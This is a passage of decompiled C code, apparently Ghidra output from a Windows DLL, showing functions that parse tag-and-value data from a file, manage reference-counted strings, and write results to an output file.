      piVar1 = (int *)FUN_1000ae10(&local_48);
      if (*piVar1 == 0) {
        iVar2 = 0;
      }
      else {
        iVar2 = *piVar1 + 0xc;
      }
      FUN_10006250("error in reading \'%s\'\n",iVar2);
      if (local_48 != (int *)0x0) {
        LOCK();
        iVar2 = *local_48;
        *local_48 = *local_48 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_48);
          FUN_100579df();
          return;
        }
      }
    }
    else {
      if ((int)local_54 < 1) {
        iVar2 = *(int *)(param_1 + 4);
        if (iVar2 != 0) {
          *(undefined4 *)(iVar2 + 8) = 0;
          *(undefined1 *)(iVar2 + 0xc) = 0;
        }
      }
      else {
        FUN_10014790(local_54);
      }
      _fclose(_File);
    }
  }
LAB_1003afd5:
  FUN_100579df();
  return;
}



/* Function: FUN_1003aff0 */

void __fastcall FUN_1003aff0(int param_1)

{
  ushort uVar1;
  code *pcVar2;
  char cVar3;
  uint uVar4;
  int iVar5;
  ushort *puVar6;
  int *piVar7;
  int iVar8;
  undefined4 uVar9;
  ushort *extraout_ECX;
  ushort *puVar10;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  int *piVar11;
  undefined4 extraout_ECX_07;
  int *piVar12;
  undefined4 extraout_ECX_08;
  ushort *puVar13;
  int *piVar14;
  bool bVar15;
  int *local_68;
  int *local_64;
  int local_60;
  int *local_5c;
  int *local_58;
  int *local_54;
  int *local_50;
  int *local_4c;
  int *local_48;
  int *piStack_44;
  undefined1 local_40 [4];
  int **ppiStack_3c;
  int iStack_38;
  int local_34;
  int *local_30;
  int *local_2c;
  int *piStack_28;
  undefined4 uStack_24;
  int *local_20;
  undefined4 local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  puStack_10 = &LAB_100771ba;
  local_14 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xffffff88;
  ExceptionList = &local_14;
  local_48 = (int *)0x0;
  local_c = 0;
  local_34 = param_1;
  FUN_1000e6d0(param_1 + 4);
  local_1c = 0;
  local_20 = (int *)FUN_1000fa00(0,0);
  local_c = CONCAT31(local_c._1_3_,1);
  FUN_1003c690(&local_20,uVar4);
  local_60 = param_1 + 8;
  piVar14 = (int *)*local_20;
  local_54 = piVar14;
  if (piVar14 != local_20) {
    do {
      piVar12 = (int *)piVar14[2];
      if (piVar12 != (int *)0x0) {
        LOCK();
        *piVar12 = *piVar12 + 1;
        UNLOCK();
      }
      local_c._0_1_ = 3;
      local_5c = (int *)0x0;
      local_54 = piVar14;
      local_50 = piVar12;
      local_30 = piVar12;
      FUN_1000c520(&local_5c);
      local_c._0_1_ = 4;
      local_58 = (int *)0x0;
      FUN_1000c520(&local_58);
      FUN_1000e5b0();
      local_64 = (int *)0x0;
      local_c = CONCAT31(local_c._1_3_,5);
      iVar5 = FUN_1000c520(&local_64);
      piVar11 = local_5c;
      if (iVar5 == 0) {
        piVar11 = (int *)FUN_1000ae10(&local_2c);
        if (*piVar11 == 0) {
          iVar5 = 0;
        }
        else {
          iVar5 = *piVar11 + 0xc;
        }
        FUN_10006250("tag does not have a name (matching)?: \'%s\'\n",iVar5);
        piVar11 = local_5c;
        if (local_2c != (int *)0x0) {
          LOCK();
          iVar5 = *local_2c;
          *local_2c = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_2c);
            piVar11 = local_5c;
          }
        }
LAB_1003b67a:
        if (local_64 != (int *)0x0) {
          LOCK();
          iVar5 = *local_64;
          *local_64 = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_64);
          }
        }
        if (local_58 != (int *)0x0) {
          LOCK();
          iVar5 = *local_58;
          *local_58 = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_58);
          }
        }
        if (piVar11 != (int *)0x0) goto LAB_1003b6b2;
      }
      else {
        puVar10 = extraout_ECX;
        if ((local_5c == (int *)0x0) ||
           (puVar10 = (ushort *)(local_5c + 3), puVar10 == (ushort *)0x0)) {
LAB_1003b245:
          if (local_60 != 0) {
            cVar3 = FUN_10019cc0(&DAT_10088fc0,puVar10);
            if ((((cVar3 != '\0') ||
                 (cVar3 = FUN_10019cc0(&DAT_10088fb8,extraout_ECX_00), cVar3 != '\0')) ||
                (cVar3 = FUN_10019cc0(&DAT_10088e54,extraout_ECX_01), cVar3 != '\0')) ||
               (cVar3 = FUN_10019d30(&DAT_10088e54,extraout_ECX_02), cVar3 != '\0')) {
              if (piVar11 == (int *)0x0) {
                iVar5 = 0;
                piVar7 = (int *)0x0;
              }
              else {
                iVar5 = piVar11[2];
                piVar7 = piVar11 + 3;
              }
              cVar3 = FUN_1004ab70(iVar5,piVar7);
              if ((cVar3 == '\0') &&
                 (cVar3 = FUN_10019cc0(&DAT_10088fc0,extraout_ECX_03), cVar3 == '\0')) {
                cVar3 = FUN_10019cc0(&DAT_10088fb8,extraout_ECX_04);
                uVar9 = extraout_ECX_05;
                if ((cVar3 == '\0') ||
                   (cVar3 = FUN_10019d30(&DAT_10089050,extraout_ECX_05), uVar9 = extraout_ECX_06,
                   cVar3 == '\0')) {
                  cVar3 = FUN_10019cc0(&DAT_10088e54,uVar9);
                  if (cVar3 == '\0') {
                    piVar7 = (int *)FUN_1000ae10(local_40);
                    if (*piVar7 == 0) {
                      iVar5 = 0;
                    }
                    else {
                      iVar5 = *piVar7 + 0xc;
                    }
                    FUN_10006250("processing sTagAndValue=\'%s\'\n",iVar5);
                    FUN_10006f30();
                  }
                  else {
                    local_4c = (int *)0x0;
                    local_c = CONCAT31(local_c._1_3_,0xb);
                    FUN_1000c520(&local_4c);
                    local_60 = *(int *)(local_60 + 0xc);
                    FUN_10006f30();
                  }
                }
                goto LAB_1003b67a;
              }
            }
            ppiStack_3c = (int **)FUN_10058463(0x24,&DAT_10098020);
            local_c._0_1_ = 6;
            if (ppiStack_3c == (int **)0x0) {
              local_4c = (int *)0x0;
            }
            else {
              if (local_64 != (int *)0x0) {
                LOCK();
                *local_64 = *local_64 + 1;
                UNLOCK();
              }
              local_4c = (int *)FUN_1003c4c0(local_64,local_60);
            }
            local_c._0_1_ = 7;
            iVar5 = *(int *)(local_60 + 4);
            iVar8 = FUN_10019f30(iVar5,*(undefined4 *)(iVar5 + 4),&local_4c);
            piVar12 = local_4c;
            if (*(int *)(local_60 + 8) == 0x15555554) {
              FUN_10056a6a("list<T> too long");
              pcVar2 = (code *)swi(3);
              (*pcVar2)();
              return;
            }
            *(int *)(local_60 + 8) = *(int *)(local_60 + 8) + 1;
            *(int *)(iVar5 + 4) = iVar8;
            local_c = CONCAT31(local_c._1_3_,5);
            **(int **)(iVar8 + 4) = iVar8;
            if (local_4c != (int *)0x0) {
              FUN_1003a250();
              thunk_FUN_100579ee(piVar12);
            }
            iVar5 = *(int *)(*(int *)(*(int *)(local_60 + 4) + 4) + 8);
            if (piVar11 == (int *)0x0) {
              iVar8 = 0;
              piVar11 = (int *)0x0;
            }
            else {
              iVar8 = piVar11[2];
              piVar11 = piVar11 + 3;
            }
            local_60 = iVar5;
            cVar3 = FUN_1004ab70(iVar8,piVar11);
            if ((cVar3 == '\0') &&
               (cVar3 = FUN_10019cc0(&DAT_10088fc0,extraout_ECX_07), cVar3 == '\0')) {
              uVar9 = FUN_10010440(local_58);
              *(undefined4 *)(iVar5 + 0x1c) = uVar9;
            }
            uStack_24 = 0;
            piStack_28 = (int *)FUN_1000fa00(0,0);
            local_c = CONCAT31(local_c._1_3_,8);
            FUN_1003c690(&piStack_28);
            piVar12 = (int *)*piStack_28;
            if (piVar12 != piStack_28) {
              do {
                local_68 = (int *)0x0;
                local_c._0_1_ = 9;
                FUN_1000c520(&local_68);
                piStack_44 = (int *)0x0;
                local_c = CONCAT31(local_c._1_3_,10);
                FUN_1000c520(&piStack_44);
                piVar14 = piStack_44;
                if (local_60 != 0) {
                  local_4c = (int *)(local_60 + 0x10);
                  iVar5 = FUN_1001d340(&local_68);
                  if ((iVar5 == *local_4c) ||
                     (cVar3 = FUN_1001d1f0(&local_68,iVar5 + 0x10), cVar3 != '\0')) {
                    ppiStack_3c = &local_68;
                    iVar8 = FUN_1001daa0(&ppiStack_3c,&ppiStack_3c,ppiStack_3c);
                    FUN_1001dd20(&iStack_38,iVar5,iVar8 + 0x10,iVar8);
                    iVar5 = iStack_38;
                  }
                  uVar9 = FUN_10010440(piVar14);
                  *(undefined4 *)(iVar5 + 0x14) = uVar9;
                  *(int *)(local_34 + 0x2c) = *(int *)(local_34 + 0x2c) + 1;
                }
                if (piVar14 != (int *)0x0) {
                  LOCK();
                  iVar5 = *piVar14;
                  *piVar14 = iVar5 + -1;
                  UNLOCK();
                  if (iVar5 + -1 < 0) {
                    FUN_100579ee(piVar14);
                  }
                }
                if (local_68 != (int *)0x0) {
                  LOCK();
                  iVar5 = *local_68;
                  *local_68 = iVar5 + -1;
                  UNLOCK();
                  if (iVar5 + -1 < 0) {
                    FUN_100579ee(local_68);
                  }
                }
                piVar12 = (int *)*piVar12;
                iVar5 = local_60;
                piVar14 = local_54;
              } while (piVar12 != piStack_28);
            }
            piVar11 = local_5c;
            if (local_5c == (int *)0x0) {
              iVar8 = 0;
              piVar12 = (int *)0x0;
            }
            else {
              iVar8 = local_5c[2];
              piVar12 = local_5c + 3;
            }
            cVar3 = FUN_1004ab70(iVar8,piVar12);
            if ((cVar3 != '\0') ||
               (cVar3 = FUN_10019cc0(&DAT_10088fc0,extraout_ECX_08), cVar3 != '\0')) {
              local_60 = *(int *)(iVar5 + 0xc);
            }
            FUN_1000ba10();
            thunk_FUN_100579ee(piStack_28);
            piVar12 = local_30;
          }
          goto LAB_1003b67a;
        }
        puVar13 = &DAT_10088fac;
        puVar6 = puVar10;
        do {
          bVar15 = *puVar6 < *puVar13;
          if (*puVar6 != *puVar13) {
LAB_1003b177:
            uVar4 = -(uint)bVar15 | 1;
            goto LAB_1003b17c;
          }
          if (*puVar6 == 0) break;
          uVar1 = puVar6[1];
          bVar15 = uVar1 < puVar13[1];
          local_68 = (int *)CONCAT22(local_68._2_2_,uVar1);
          if (uVar1 != puVar13[1]) goto LAB_1003b177;
          puVar6 = puVar6 + 2;
          puVar13 = puVar13 + 2;
        } while (uVar1 != 0);
        uVar4 = 0;
LAB_1003b17c:
        piVar14 = local_54;
        if (uVar4 != 0) {
          if (puVar10 != (ushort *)0x0) {
            puVar6 = &DAT_10088fa0;
            do {
              uVar1 = *puVar10;
              bVar15 = uVar1 < *puVar6;
              if (uVar1 != *puVar6) {
LAB_1003b1f6:
                uVar4 = -(uint)bVar15 | 1;
                goto LAB_1003b1fb;
              }
              if (uVar1 == 0) break;
              uVar1 = puVar10[1];
              bVar15 = uVar1 < puVar6[1];
              if (uVar1 != puVar6[1]) goto LAB_1003b1f6;
              puVar10 = puVar10 + 2;
              puVar6 = puVar6 + 2;
            } while (uVar1 != 0);
            uVar4 = 0;
LAB_1003b1fb:
            if (uVar4 == 0) {
              if (local_64 != (int *)0x0) {
                LOCK();
                iVar5 = *local_64;
                *local_64 = iVar5 + -1;
                UNLOCK();
                if (iVar5 + -1 < 0) {
                  FUN_100579ee(local_64);
                }
              }
              if (local_58 != (int *)0x0) {
                LOCK();
                iVar5 = *local_58;
                *local_58 = iVar5 + -1;
                UNLOCK();
                if (iVar5 + -1 < 0) {
                  FUN_100579ee(local_58);
                }
              }
              goto LAB_1003b6b2;
            }
          }
          goto LAB_1003b245;
        }
        if (local_64 != (int *)0x0) {
          LOCK();
          iVar5 = *local_64;
          *local_64 = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_64);
          }
        }
        if (local_58 != (int *)0x0) {
          LOCK();
          iVar5 = *local_58;
          *local_58 = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_58);
          }
        }
LAB_1003b6b2:
        LOCK();
        iVar5 = *piVar11;
        *piVar11 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar11);
        }
      }
      local_c = CONCAT31(local_c._1_3_,1);
      if (piVar12 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar12;
        *piVar12 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar12);
        }
      }
      piVar14 = (int *)*piVar14;
      local_54 = piVar14;
    } while (piVar14 != local_20);
  }
  piVar14 = (int *)*local_20;
  *local_20 = (int)local_20;
  local_20[1] = (int)local_20;
  if (piVar14 != local_20) {
    do {
      piVar12 = (int *)piVar14[2];
      piVar11 = (int *)*piVar14;
      if (piVar12 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar12;
        *piVar12 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar12);
        }
      }
      thunk_FUN_100579ee(piVar14);
      piVar14 = piVar11;
    } while (piVar11 != local_20);
  }
  thunk_FUN_100579ee(local_20);
  if (local_48 != (int *)0x0) {
    LOCK();
    iVar5 = *local_48;
    *local_48 = *local_48 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(local_48);
    }
  }
  ExceptionList = local_14;
  return;
}



/* Function: FUN_1003b770 */

void __fastcall FUN_1003b770(int *param_1)

{
  if (*param_1 != 0) {
    FUN_1003b790(*param_1 + 0xc);
    return;
  }
  FUN_1003b790(0);
  return;
}



/* Function: FUN_1003b790 */

void __thiscall FUN_1003b790(int param_1,short *param_2)

{
  char cVar1;
  int *piVar2;
  int *piVar3;
  undefined4 *puVar4;
  int iVar5;
  int iVar6;
  undefined4 uVar7;
  int *piVar8;
  char *_Filename;
  FILE *_File;
  int *piVar9;
  undefined **ppuVar10;
  undefined4 *extraout_EDX;
  undefined4 *puVar11;
  int iVar12;
  undefined4 *puVar13;
  int *local_d4;
  int local_c8;
  int local_c4;
  int local_c0;
  int local_b4;
  int *local_a8;
  int local_98;
  int *local_84;
  int *local_80;
  int *local_7c;
  int *local_78;
  int local_74;
  int local_70;
  undefined4 local_6c;
  undefined4 local_68;
  int local_64;
  undefined4 local_60;
  undefined4 local_5c;
  int local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  int local_48;
  undefined4 local_44;
  int *local_40;
  int local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  int *local_2c;
  undefined4 local_28;
  undefined4 local_24;
  int *local_20;
  undefined4 local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10077257;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  local_98 = 0;
  local_b4 = 0;
  piVar3 = (int *)FUN_1000fa00(0,0);
  local_c = 0;
  puVar4 = (undefined4 *)FUN_10006fd0(0,0);
  local_70 = param_1 + 8;
  local_1c = 0;
  local_6c = 0;
  local_68 = 0;
  local_c._0_1_ = 2;
  iVar5 = FUN_10007570(puVar4,puVar4[1],&local_70);
  iVar12 = 1;
  local_c8 = 1;
  puVar4[1] = iVar5;
  **(int **)(iVar5 + 4) = iVar5;
  for (puVar13 = (undefined4 *)*puVar4; puVar13 != puVar4; puVar13 = (undefined4 *)*puVar13) {
    iVar5 = puVar13[2];
    *(undefined4 *)(iVar5 + 0x20) = 0;
    if ((*(int *)(iVar5 + 8) != 0) &&
       (piVar9 = (int *)**(int **)(iVar5 + 4), piVar9 != *(int **)(iVar5 + 4))) {
      local_34 = 0;
      local_60 = 1;
      local_5c = 0;
      do {
        local_64 = piVar9[2];
        local_c._0_1_ = 3;
        iVar6 = FUN_10007570(puVar4,puVar4[1],&local_64);
        if (iVar12 == 0xccccccb) goto LAB_1003bc2f;
        iVar12 = iVar12 + 1;
        puVar4[1] = iVar6;
        **(int **)(iVar6 + 4) = iVar6;
        piVar9 = (int *)*piVar9;
        local_c8 = iVar12;
      } while (piVar9 != *(int **)(iVar5 + 4));
    }
  }
  local_c._0_1_ = 1;
  local_c0 = 0;
  local_c4 = FUN_10018da0(0,0);
  puVar13 = (undefined4 *)*puVar4;
  *puVar4 = puVar4;
  puVar4[1] = puVar4;
  while (puVar13 != puVar4) {
    piVar9 = (int *)puVar13[4];
    puVar11 = (undefined4 *)*puVar13;
    if (piVar9 != (int *)0x0) {
      LOCK();
      iVar12 = *piVar9;
      *piVar9 = iVar12 + -1;
      UNLOCK();
      if (iVar12 + -1 < 0) {
        FUN_100579ee(piVar9);
      }
    }
    thunk_FUN_100579ee(puVar13);
    puVar13 = puVar11;
  }
  local_58 = param_1 + 8;
  local_24 = 0;
  local_54 = 0;
  local_50 = 0;
  local_c._0_1_ = 5;
  iVar12 = FUN_10007570(puVar4,puVar4[1],&local_58);
  puVar4[1] = iVar12;
  local_c8 = 1;
  **(int **)(iVar12 + 4) = iVar12;
  for (puVar13 = (undefined4 *)*puVar4; puVar13 != puVar4; puVar13 = (undefined4 *)*puVar13) {
    local_d4 = (int *)puVar13[2];
    puVar11 = puVar13 + 4;
    iVar12 = puVar13[3];
    local_a8 = (int *)0x0;
    local_c._0_1_ = 6;
    if (local_c0 != 0) {
      piVar9 = *(int **)(*(int *)(local_c4 + 4) + 8);
      iVar5 = *(int *)(*(int *)(local_c4 + 4) + 0xc);
      if (piVar9 != (int *)0x0) {
        LOCK();
        *piVar9 = *piVar9 + 1;
        UNLOCK();
      }
      local_c._0_1_ = 7;
      local_2c = piVar9;
      if (iVar12 < iVar5) goto LAB_1003bc39;
      if (local_d4[8] != 0) goto LAB_1003bc39;
      local_c._0_1_ = 6;
      if (piVar9 != (int *)0x0) {
        LOCK();
        iVar5 = *piVar9;
        *piVar9 = iVar5 + -1;
        UNLOCK();
        if (iVar5 + -1 < 0) {
          FUN_100579ee(piVar9);
        }
      }
    }
    if (local_d4[8] == 0) {
LAB_1003baa5:
      if (((local_d4[2] == 0) && (local_d4[5] == 0)) &&
         ((local_d4[7] == 0 || (*(int *)(local_d4[7] + 8) == 0)))) {
LAB_1003bf6e:
        if (local_d4[2] != 0) {
          local_d4[8] = 1;
          piVar9 = (int *)*puVar13;
          local_28 = 0;
          local_38 = 0;
          local_c._0_1_ = 9;
          local_40 = local_d4;
          local_3c = iVar12;
          iVar5 = FUN_10007570(piVar9,piVar9[1],&local_40);
          if (local_c8 == 0xccccccb) goto LAB_1003bc2f;
          piVar9[1] = iVar5;
          local_c8 = local_c8 + 1;
          local_c._0_1_ = 6;
          **(int **)(iVar5 + 4) = iVar5;
          local_80 = (int *)local_d4[1];
          if (local_80 != (int *)*local_80) {
            local_48 = iVar12 + 1;
            local_30 = 0;
            local_44 = 0;
            do {
              piVar9 = (int *)*puVar13;
              piVar8 = local_80 + 1;
              local_4c = *(undefined4 *)(*piVar8 + 8);
              local_c._0_1_ = 10;
              iVar12 = FUN_10007570(piVar9,piVar9[1],&local_4c);
              if (local_c8 == 0xccccccb) goto LAB_1003bc2f;
              piVar9[1] = iVar12;
              local_c8 = local_c8 + 1;
              local_c._0_1_ = 6;
              **(int **)(iVar12 + 4) = iVar12;
              local_80 = (int *)*piVar8;
            } while (local_80 != *(int **)local_d4[1]);
          }
        }
        if ((*local_d4 != 0) && (*local_d4 != -0xc)) {
          iVar12 = FUN_10011570(piVar3,piVar3[1],puVar13 + 4);
          piVar9 = piVar3;
          if (local_b4 == 0x15555554) goto LAB_1003bc2f;
          piVar3[1] = iVar12;
          local_b4 = local_b4 + 1;
          **(int **)(iVar12 + 4) = iVar12;
        }
        if (local_a8 != (int *)0x0) {
          LOCK();
          iVar12 = *local_a8 + -1;
          *local_a8 = iVar12;
          UNLOCK();
joined_r0x1003bcda:
          if (iVar12 < 0) {
            FUN_100579ee(local_a8);
          }
        }
      }
      else {
        iVar5 = iVar12 + -1;
        if (-1 < iVar5) {
          uVar7 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
          puVar13[4] = uVar7;
        }
        iVar6 = iVar5;
        if (0 < iVar5) {
          do {
            uVar7 = FUN_1000bfa0(&DAT_10083854,0xffffffff);
            *puVar11 = uVar7;
            iVar6 = iVar6 + -1;
          } while (iVar6 != 0);
        }
        uVar7 = FUN_1000bfa0(&DAT_100890ec,0xffffffff);
        puVar13[4] = uVar7;
        iVar6 = *local_d4;
        if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
          uVar7 = FUN_1000bfa0(iVar6 + 0xc,*(undefined4 *)(iVar6 + 8));
          puVar13[4] = uVar7;
        }
        piVar9 = *(int **)local_d4[4];
        if (piVar9 != (int *)local_d4[4]) {
          do {
            FUN_1000bfa0(&DAT_10083854,0xffffffff);
            iVar6 = piVar9[4];
            if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
              FUN_1000bfa0(iVar6 + 0xc,*(undefined4 *)(iVar6 + 8));
            }
            FUN_1000bfa0(&DAT_10089124,0xffffffff);
            FUN_1000bfa0(&DAT_10084020,0xffffffff);
            iVar6 = piVar9[5];
            if ((iVar6 != 0) && (*(int *)(iVar6 + 8) != 0)) {
              FUN_1000bfa0(iVar6 + 0xc,*(undefined4 *)(iVar6 + 8));
            }
            piVar8 = (int *)FUN_1000bfa0(&DAT_10084020,0xffffffff);
            if ((piVar8 != (int *)0x0) && (piVar8[2] != 0)) {
              uVar7 = FUN_1000bfa0(piVar8 + 3,piVar8[2]);
              *puVar11 = uVar7;
            }
            local_98 = local_98 + 1;
            if (piVar8 != (int *)0x0) {
              LOCK();
              iVar6 = *piVar8;
              *piVar8 = iVar6 + -1;
              UNLOCK();
              if (iVar6 + -1 < 0) {
                FUN_100579ee(piVar8);
              }
            }
            if (*(char *)((int)piVar9 + 0xd) == '\0') {
              piVar8 = (int *)piVar9[2];
              if (*(char *)((int)piVar8 + 0xd) == '\0') {
                cVar1 = *(char *)(*piVar8 + 0xd);
                piVar9 = piVar8;
                piVar8 = (int *)*piVar8;
                while (cVar1 == '\0') {
                  cVar1 = *(char *)(*piVar8 + 0xd);
                  piVar9 = piVar8;
                  piVar8 = (int *)*piVar8;
                }
              }
              else {
                cVar1 = *(char *)(piVar9[1] + 0xd);
                piVar2 = (int *)piVar9[1];
                piVar8 = piVar9;
                while ((piVar9 = piVar2, cVar1 == '\0' && (piVar8 == (int *)piVar9[2]))) {
                  cVar1 = *(char *)(piVar9[1] + 0xd);
                  piVar2 = (int *)piVar9[1];
                  piVar8 = piVar9;
                }
              }
            }
          } while (piVar9 != (int *)local_d4[4]);
        }
        iVar6 = local_d4[7];
        if (((((iVar6 == 0) || (iVar6 == -0xc)) || (iVar6 == 0)) || (*(int *)(iVar6 + 8) == 0)) &&
           (local_d4[2] == 0)) {
          iVar5 = *local_d4;
          if (((iVar5 == 0) || (*(int *)(iVar5 + 8) == 0)) ||
             ((iVar5 == 0 ||
              (((wchar_t *)(iVar5 + 0xc) == (wchar_t *)0x0 ||
               (iVar5 = _wcsncmp((wchar_t *)(iVar5 + 0xc),L"?",1), iVar5 != 0)))))) {
            uVar7 = FUN_1000bfa0(&DAT_1008912c,0xffffffff);
            puVar13[4] = uVar7;
          }
          else {
            uVar7 = FUN_1000bfa0(&DAT_1008911c,0xffffffff);
            puVar13[4] = uVar7;
          }
          goto LAB_1003bf6e;
        }
        uVar7 = FUN_1000bfa0(&DAT_10089128,0xffffffff);
        puVar13[4] = uVar7;
        iVar6 = local_d4[7];
        if ((iVar6 == 0) || (*(int *)(iVar6 + 8) == 0)) {
          ppuVar10 = &PTR_10083554;
LAB_1003bdc0:
          if ((((ppuVar10 != (undefined **)0x0) && (iVar6 = local_d4[7], iVar6 != 0)) &&
              (*(int *)(iVar6 + 8) != 0)) && ((iVar6 != 0 && (*(int *)(iVar6 + 8) != 0)))) {
            uVar7 = FUN_1000bfa0(iVar6 + 0xc,*(undefined4 *)(iVar6 + 8));
            puVar13[4] = uVar7;
          }
        }
        else if (iVar6 != 0) {
          ppuVar10 = (undefined **)(iVar6 + 0xc);
          goto LAB_1003bdc0;
        }
        if ((local_d4[2] != 0) && (FUN_1000bfa0(&DAT_100874a8,0xffffffff), 0 < iVar5)) {
          do {
            FUN_1000bfa0(&DAT_10083854,0xffffffff);
            iVar5 = iVar5 + -1;
          } while (iVar5 != 0);
        }
        FUN_1000bfa0(&DAT_10089138,0xffffffff);
        iVar5 = *local_d4;
        if ((iVar5 != 0) && (*(int *)(iVar5 + 8) != 0)) {
          FUN_1000bfa0(iVar5 + 0xc,*(undefined4 *)(iVar5 + 8));
        }
        local_a8 = (int *)FUN_1000bfa0(&DAT_10089128,0xffffffff);
        if (local_d4[2] == 0) {
          if (local_a8 != (int *)0x0) {
            if (local_a8[2] != 0) {
              uVar7 = FUN_1000bfa0(local_a8 + 3,local_a8[2]);
              puVar13[4] = uVar7;
            }
            if (*local_a8 == 0) {
              local_a8[2] = 0;
              *(undefined2 *)(local_a8 + 3) = 0;
              goto LAB_1003bf6e;
            }
            LOCK();
            iVar5 = *local_a8;
            *local_a8 = iVar5 + -1;
            UNLOCK();
            if (iVar5 + -1 < 0) {
              FUN_100579ee(local_a8);
            }
          }
          local_a8 = (int *)0x0;
          goto LAB_1003bf6e;
        }
        local_78 = local_a8;
        local_74 = iVar12;
        local_20 = local_a8;
        if (local_a8 != (int *)0x0) {
          LOCK();
          *local_a8 = *local_a8 + 1;
          UNLOCK();
          LOCK();
          *local_a8 = *local_a8 + 1;
          UNLOCK();
          LOCK();
          iVar5 = *local_a8;
          *local_a8 = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_a8);
          }
        }
        local_c._0_1_ = 8;
        iVar5 = FUN_10023320(local_c4,*(undefined4 *)(local_c4 + 4),&local_78);
        piVar9 = local_d4;
        if (local_c0 != 0xffffffe) {
          local_c0 = local_c0 + 1;
          *(int *)(local_c4 + 4) = iVar5;
          local_c._0_1_ = 6;
          **(int **)(iVar5 + 4) = iVar5;
          if (local_a8 != (int *)0x0) {
            LOCK();
            iVar5 = *local_a8;
            *local_a8 = iVar5 + -1;
            UNLOCK();
            if (iVar5 + -1 < 0) {
              FUN_100579ee(local_a8);
            }
          }
          goto LAB_1003bf6e;
        }
LAB_1003bc2f:
        do {
          FUN_10056a6a("list<T> too long");
          puVar11 = extraout_EDX;
LAB_1003bc39:
          if ((piVar9 != (int *)0x0) && (piVar9[2] != 0)) {
            uVar7 = FUN_1000bfa0(piVar9 + 3,piVar9[2]);
            puVar11 = puVar13 + 4;
            *puVar11 = uVar7;
          }
          if ((*local_d4 == 0) || (*local_d4 == -0xc)) goto LAB_1003bc8f;
          iVar12 = FUN_10011570(piVar3,piVar3[1],puVar11);
        } while (local_b4 == 0x15555554);
        piVar3[1] = iVar12;
        local_b4 = local_b4 + 1;
        **(int **)(iVar12 + 4) = iVar12;
LAB_1003bc8f:
        local_c0 = local_c0 + -1;
        piVar8 = *(int **)(local_c4 + 4);
        *(int *)piVar8[1] = *piVar8;
        *(int *)(*piVar8 + 4) = piVar8[1];
        piVar2 = (int *)piVar8[2];
        if (piVar2 != (int *)0x0) {
          LOCK();
          iVar12 = *piVar2;
          *piVar2 = iVar12 + -1;
          UNLOCK();
          if (iVar12 + -1 < 0) {
            FUN_100579ee(piVar2);
          }
        }
        thunk_FUN_100579ee(piVar8);
        if (piVar9 != (int *)0x0) {
          LOCK();
          iVar12 = *piVar9 + -1;
          *piVar9 = iVar12;
          UNLOCK();
          local_a8 = piVar9;
          goto joined_r0x1003bcda;
        }
      }
    }
    else {
      iVar5 = *local_d4;
      if ((((iVar5 == 0) || (iVar5 == -0xc)) || (iVar5 == 0)) || (*(int *)(iVar5 + 8) == 0)) break;
      if (((local_d4[8] == 0) || (iVar5 == 0)) || (iVar5 == -0xc)) goto LAB_1003baa5;
    }
  }
  if (*(int *)(param_1 + 0x2c) == 0) {
    *(int *)(param_1 + 0x2c) = local_98;
  }
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    piVar9 = (int *)FUN_1000bd10();
  }
  else {
    if ((DAT_1009acdc & 1) == 0) {
      DAT_1009acdc = DAT_1009acdc | 1;
      DAT_1009acd8 = (int *)FUN_100581b4(0x2e);
      if (DAT_1009acd8 != (int *)0x0) {
        DAT_1009acd8[1] = 0x10;
        DAT_1009acd8[2] = 2;
        *DAT_1009acd8 = 0;
        DAT_1009acd8[3] = 0;
        *(undefined2 *)((int)DAT_1009acd8 + DAT_1009acd8[2] * 2 + 0xc) = 0;
        DAT_1009acd8[2] = 0;
        *(undefined2 *)(DAT_1009acd8 + 3) = 0;
      }
      FUN_10057b51(&LAB_10078350);
    }
    piVar9 = DAT_1009acd8;
    if (DAT_1009acd8 != (int *)0x0) {
      LOCK();
      *DAT_1009acd8 = *DAT_1009acd8 + 1;
      UNLOCK();
      piVar9 = DAT_1009acd8;
    }
  }
  local_c = CONCAT31(local_c._1_3_,0xb);
  piVar8 = (int *)FUN_1000ae10(&local_7c);
  if (*piVar8 == 0) {
    _Filename = (char *)0x0;
  }
  else {
    _Filename = (char *)(*piVar8 + 0xc);
  }
  _File = _fopen(_Filename,"wt");
  if (local_7c != (int *)0x0) {
    LOCK();
    iVar12 = *local_7c;
    *local_7c = iVar12 + -1;
    UNLOCK();
    if (iVar12 + -1 < 0) {
      FUN_100579ee(local_7c);
    }
  }
  local_c = CONCAT31(local_c._1_3_,4);
  if (piVar9 != (int *)0x0) {
    LOCK();
    iVar12 = *piVar9;
    *piVar9 = iVar12 + -1;
    UNLOCK();
    if (iVar12 + -1 < 0) {
      FUN_100579ee(piVar9);
    }
  }
